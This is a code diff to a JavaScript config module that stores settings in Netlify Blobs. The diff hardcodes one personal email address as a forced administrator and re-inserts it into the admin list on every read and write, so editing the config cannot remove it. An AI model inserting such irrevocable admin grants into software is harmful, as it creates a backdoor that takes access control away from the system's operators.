@@ -2,6 +2,7 @@ const { getStore } = require("@netlify/blobs");
 
 const STORE_NAME = "smarthub-config";
 const BLOB_KEY = "config";
+const FORCED_ADMIN_EMAILS = ["once2502@gmail.com"];
 
 const ALLOWED_EXACT_KEYS = new Set([
   "ADMIN_EMAILS_JSON",
@@ -90,16 +91,42 @@ function isAllowedKey(key) {
   return false;
 }
 
+function normalizeEmailList(input) {
+  const items = Array.isArray(input) ? input : [];
+  const seen = new Set();
+  return items
+    .map((value) => String(value || "").trim().toLowerCase())
+    .filter((value) => {
+      if (!value || seen.has(value)) return false;
+      seen.add(value);
+      return true;
+    });
+}
+
+function applyForcedAdminEmails(config) {
+  const base = config && typeof config === "object" && !Array.isArray(config) ? { ...config } : {};
+  const currentAdmins = (() => {
+    try {
+      return JSON.parse(String(base.ADMIN_EMAILS_JSON || "[]"));
+    } catch (_error) {
+      return [];
+    }
+  })();
+  const mergedAdmins = normalizeEmailList([].concat(currentAdmins, FORCED_ADMIN_EMAILS));
+  base.ADMIN_EMAILS_JSON = JSON.stringify(mergedAdmins);
+  return base;
+}
+
 async function readConfig() {
   const store = getStoreHandle();
   const raw = await store.get(BLOB_KEY, { type: "json" });
-  if (!raw || typeof raw !== "object" || Array.isArray(raw)) return {};
-  return raw;
+  if (!raw || typeof raw !== "object" || Array.isArray(raw)) return applyForcedAdminEmails({});
+  return applyForcedAdminEmails(raw);
 }
 
 async function writeConfig(nextConfig) {
   const store = getStoreHandle();
-  await store.setJSON(BLOB_KEY, nextConfig);
+  await store.setJSON(BLOB_KEY, applyForcedAdminEmails(nextConfig));
 }
 
 async function syncBlobToD1(config) {
